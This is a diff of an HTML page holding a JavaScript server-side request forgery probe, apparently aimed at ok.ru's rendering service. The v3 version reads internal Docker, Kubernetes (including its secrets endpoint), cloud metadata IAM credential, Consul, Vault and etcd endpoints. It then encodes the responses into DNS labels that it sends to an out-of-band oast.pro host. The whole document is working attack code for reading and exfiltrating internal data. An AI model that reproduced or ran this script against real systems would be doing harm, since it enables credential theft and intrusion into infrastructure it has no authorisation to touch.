@@ -4,150 +4,146 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — escalation probe v2
-// OOB: d9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro (profile action button session)
+// ok.ru Chromium SSRF — escalation probe v3
+// DNS-label encoding: timing + error type in label, no HTTP needed for exfil
 const OOB = 'd9kjf7b6b8m9jk7s693gjsxj13ripi6b4.oast.pro';
 const T0 = Date.now();
 
-// Sanitize label for DNS subdomain (a-z0-9 and hyphen only, max 60 chars)
 const clean = (s) => s.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 60);
 
-// Exfil: Image (no-cors HTTPS, bypasses PNA/CORS for GET) + fetch no-cors fallback
-const oob = (label, data) => {
-  const j = data !== undefined ? JSON.stringify(data).substring(0, 250) : '';
-  const url = `https://${clean(label)}.${OOB}/?v=${encodeURIComponent(j)}`;
-  new Image().src = url;
-  fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(6000) }).catch(() => {});
+// DNS-only exfil: data is encoded IN the label (no HTTP needed)
+const dnsOob = (label) => {
+  const l = clean(label);
+  new Image().src = `https://${l}.${OOB}/`;
+  // Also try HTTP in case it starts working
+  fetch(`https://${l}.${OOB}/`, { mode: 'no-cors', signal: AbortSignal.timeout(3000) }).catch(() => {});
 };
 
-// Full CORS read attempt — records error type + timing
-const tryRead = async (url, timeoutMs = 8000) => {
+// Error code abbreviations: ab=AbortError/timeout, te=TypeError, ne=NetworkError
+const errCode = (e) => {
+  if (!e) return 'unk';
+  const n = e.name || '';
+  const m = (e.message || '').substring(0, 30).toLowerCase();
+  if (n === 'AbortError') return 'ab';
+  if (n === 'TypeError' && m.includes('cors')) return 'cors';
+  if (n === 'TypeError' && m.includes('failed')) return 'te-ff';
+  if (n === 'TypeError') return 'te';
+  if (n === 'NetworkError') return 'ne';
+  return n.substring(0, 4).toLowerCase();
+};
+
+// Probe + encode result in DNS label: labelPrefix-ok-{ms} or labelPrefix-err-{ec}-{ms}
+const probe = async (labelPrefix, url, timeoutMs = 5000) => {
   const t0 = Date.now();
   try {
     const r = await fetch(url, { signal: AbortSignal.timeout(timeoutMs) });
     const body = await r.text();
-    return { ms: Date.now() - t0, ok: true, status: r.status, body: body.substring(0, 500) };
+    const ms = Date.now() - t0;
+    // Success: encode status + first 8 chars of body (safe chars only)
+    const bodySnip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
+    dnsOob(`${labelPrefix}-ok-${r.status}-${ms}ms-${bodySnip}`);
+    // If we actually got a body, send it in chunks via DNS
+    if (body.length > 0) {
+      const hex = Array.from(new TextEncoder().encode(body.substring(0, 60)))
+        .map(b => b.toString(16).padStart(2, '0')).join('');
+      const chunks = hex.match(/.{1,50}/g) || [];
+      chunks.forEach((chunk, i) => dnsOob(`${labelPrefix}-body${i}-${chunk}`));
+    }
+    return { ok: true, ms, status: r.status, body };
   } catch (e) {
-    return { ms: Date.now() - t0, ok: false, err: e.name + ':' + e.message.substring(0, 100) };
+    const ms = Date.now() - t0;
+    const ec = errCode(e);
+    dnsOob(`${labelPrefix}-err-${ec}-${ms}ms`);
+    return { ok: false, ms, err: e };
   }
 };
 
-// no-cors timing only (sends request, can't read response)
-const timingProbe = async (url, timeoutMs = 5000) => {
+// Timing-only (no-cors) for when we just need TCP reachability
+const timingProbe = async (labelPrefix, url, timeoutMs = 3000) => {
   const t0 = Date.now();
   try {
     await fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(timeoutMs) });
-    return { ms: Date.now() - t0, state: 'sent' };
+    const ms = Date.now() - t0;
+    dnsOob(`${labelPrefix}-sent-${ms}ms`);
+    return { ms, state: 'sent' };
   } catch (e) {
-    return { ms: Date.now() - t0, state: e.name };
+    const ms = Date.now() - t0;
+    const ec = errCode(e);
+    dnsOob(`${labelPrefix}-terr-${ec}-${ms}ms`);
+    return { ms, state: ec };
   }
 };
 
-// WebSocket probe (different path than fetch — bypasses some PNA checks)
-const wsProbe = (url, label) => new Promise(resolve => {
+// WebSocket: encode close code and error in DNS label
+const wsProbe = (labelPrefix, url) => new Promise(resolve => {
   try {
     const ws = new WebSocket(url);
-    ws.onopen  = () => { oob(`${label}-ws-open`,  { url }); };
-    ws.onmessage = (e) => { oob(`${label}-ws-msg`, { data: e.data.substring(0, 400) }); ws.close(); };
-    ws.onerror = (e) => { oob(`${label}-ws-err`,  { type: e.type }); };
-    ws.onclose = (e) => { oob(`${label}-ws-close`, { code: e.code, reason: String(e.reason).substring(0, 50) }); };
-    setTimeout(() => { try { ws.close(); } catch(_){} resolve(); }, 8000);
+    ws.onopen   = () => dnsOob(`${labelPrefix}-wsopen`);
+    ws.onmessage = (e) => {
+      const snip = (e.data || '').substring(0, 20).replace(/[^a-z0-9]/gi, '').toLowerCase();
+      dnsOob(`${labelPrefix}-wsmsg-${snip}`);
+      ws.close();
+    };
+    ws.onerror  = () => dnsOob(`${labelPrefix}-wserr`);
+    ws.onclose  = (e) => {
+      dnsOob(`${labelPrefix}-wsclose-c${e.code}-${e.wasClean ? 'cl' : 'ab'}`);
+      resolve();
+    };
+    setTimeout(() => { try { ws.close(); } catch(_){} resolve(); }, 6000);
   } catch (e) {
-    oob(`${label}-ws-exc`, { err: e.message.substring(0, 80) });
+    dnsOob(`${labelPrefix}-wsexc`);
     resolve();
   }
 });
 
 (async () => {
-  // ── ANNOUNCE ──────────────────────────────────────────────────────────────
-  oob('exec-v2', { ua: navigator.userAgent.substring(0, 120), ts: T0 });
+  // ANNOUNCE
+  const ua = navigator.userAgent.substring(0, 60).replace(/[^a-z0-9. /]/gi, '').toLowerCase();
+  dnsOob(`exec-v3-${clean(ua).substring(0, 40)}`);
 
   // ── DOCKER API (172.17.0.1:2375) ─────────────────────────────────────────
-  // Try full CORS read first — if PNA is relaxed in this headless, we get data
-  const dockerEndpoints = [
-    '/_ping',
-    '/version',
-    '/info',
-    '/containers/json',
-    '/images/json',
-  ];
-  for (const ep of dockerEndpoints) {
-    const url = `http://172.17.0.1:2375${ep}`;
-    const r = await tryRead(url, 5000);
-    oob(`docker${ep.replace(/\//g, '-')}`, r);
-    // If we actually got data — send full body separately
-    if (r.ok) {
-      oob(`DOCKER-HIT${ep.replace(/\//g, '-')}`, { CRITICAL: true, status: r.status, body: r.body });
-    }
-  }
+  // /_ping first (quick confirm)
+  await probe('dp', 'http://172.17.0.1:2375/_ping', 5000);
+  // Full read of useful endpoints
+  await probe('dv', 'http://172.17.0.1:2375/version', 5000);
+  await probe('di', 'http://172.17.0.1:2375/info', 5000);
+  await probe('dc', 'http://172.17.0.1:2375/containers/json', 5000);
 
-  // Also try alternative Docker bridge addresses
-  for (const ip of ['172.18.0.1', '172.16.0.1']) {
-    const r = await timingProbe(`http://${ip}:2375/_ping`, 2000);
-    oob(`docker-alt-${ip.replace(/\./g, '-')}`, r);
-  }
+  // Alt bridge: timing only
+  await timingProbe('dalt-17218', 'http://172.18.0.1:2375/_ping', 2000);
+  await timingProbe('dalt-17216', 'http://172.16.0.1:2375/_ping', 2000);
 
-  // ── KUBERNETES API (10.96.0.1) ───────────────────────────────────────────
-  const k8sEndpoints = [
-    '/api',
-    '/api/v1',
-    '/api/v1/namespaces',
-    '/api/v1/pods',
-    '/api/v1/secrets',
-    '/api/v1/configmaps',
-    '/apis/apps/v1/deployments',
-    '/healthz',
-    '/version',
-  ];
-  for (const ep of k8sEndpoints) {
-    const url = `http://10.96.0.1:8080${ep}`;
-    const r = await tryRead(url, 8000);
-    oob(`k8s-8080${ep.replace(/\//g, '-')}`, r);
-    if (r.ok) {
-      oob(`K8S-HIT${ep.replace(/\//g, '-')}`, { CRITICAL: true, status: r.status, body: r.body });
-    }
-  }
+  // ── KUBERNETES API (10.96.0.1:8080) ──────────────────────────────────────
+  await probe('k-api',   'http://10.96.0.1:8080/api', 6000);
+  await probe('k-apiv1', 'http://10.96.0.1:8080/api/v1', 6000);
+  await probe('k-pods',  'http://10.96.0.1:8080/api/v1/pods', 6000);
+  await probe('k-ns',    'http://10.96.0.1:8080/api/v1/namespaces', 6000);
+  await probe('k-sec',   'http://10.96.0.1:8080/api/v1/secrets', 6000);
+  await probe('k-vers',  'http://10.96.0.1:8080/version', 6000);
+  await probe('k-hz',    'http://10.96.0.1:8080/healthz', 6000);
 
-  // K8s port 6443 (TLS — try https://)
-  const r6443 = await tryRead('https://10.96.0.1:6443/api', 8000);
-  oob('k8s-6443-api', r6443);
+  // K8s 6443 (TLS)
+  await probe('k6443', 'https://10.96.0.1:6443/api', 6000);
 
-  // K8s WebSocket watch — often bypasses CORS checks on insecure port
-  await wsProbe('ws://10.96.0.1:8080/api/v1/pods?watch=true', 'k8s-ws-pods');
-  await wsProbe('ws://10.96.0.1:8080/api/v1/events?watch=true', 'k8s-ws-events');
+  // WebSocket watch endpoints
+  await wsProbe('kwspods', 'ws://10.96.0.1:8080/api/v1/pods?watch=true');
+  await wsProbe('kwsevts',  'ws://10.96.0.1:8080/api/v1/events?watch=true');
 
   // ── IMDS ─────────────────────────────────────────────────────────────────
-  // Full read attempt (previous: only 80ms timeout; now 5s to see if response arrives)
-  const imdsTargets = {
-    'imds-root':  'http://169.254.169.254/',
-    'imds-meta':  'http://169.254.169.254/latest/meta-data/',
-    'imds-iam':   'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-    'imds-token': 'http://169.254.169.254/latest/api/token',
-    'imds-yc':    'http://169.254.169.254/computeMetadata/v1/project/project-id',
-  };
-  for (const [label, url] of Object.entries(imdsTargets)) {
-    const r = await tryRead(url, 5000);
-    oob(label, r);
-    if (r.ok) oob(`IMDS-HIT-${label}`, { CRITICAL: true, body: r.body });
-  }
+  await probe('imds-r',   'http://169.254.169.254/',                                          5000);
+  await probe('imds-m',   'http://169.254.169.254/latest/meta-data/',                         5000);
+  await probe('imds-iam', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',5000);
+  await probe('imds-tok', 'http://169.254.169.254/latest/api/token',                          5000);
+  await probe('imds-yc',  'http://169.254.169.254/computeMetadata/v1/project/project-id',     5000);
 
-  // ── INTERNAL CONSUL/VAULT/ETCD ───────────────────────────────────────────
-  const internalSvcs = {
-    'consul-8500':  'http://10.96.0.1:8500/v1/agent/self',
-    'vault-8200':   'http://10.96.0.1:8200/v1/sys/health',
-    'etcd-2379':    'http://10.96.0.1:2379/health',
-    'etcd-2380':    'http://10.96.0.1:2380/members',
-    'docker-9323':  'http://172.17.0.1:9323/metrics',   // Docker metrics endpoint
-    'k8s-10250':    'https://10.96.0.1:10250/pods',     // kubelet API (if exposed)
-  };
-  for (const [label, url] of Object.entries(internalSvcs)) {
-    const r = await tryRead(url, 5000);
-    oob(label, r);
-    if (r.ok) oob(`SVC-HIT-${label}`, { CRITICAL: true, body: r.body });
-  }
+  // ── INTERNAL SERVICES ────────────────────────────────────────────────────
+  await probe('csul',  'http://10.96.0.1:8500/v1/agent/self',         3000);
+  await probe('vlt',   'http://10.96.0.1:8200/v1/sys/health',         3000);
+  await probe('etcd',  'http://10.96.0.1:2379/health',                3000);
+  await probe('dmet',  'http://172.17.0.1:9323/metrics',              3000);
 
-  // ── DONE ─────────────────────────────────────────────────────────────────
-  oob('done-v2', { elapsed: Date.now() - T0 });
+  // DONE
+  dnsOob(`done-v3-${Date.now() - T0}ms`);
 })();
 </script>
 </body>
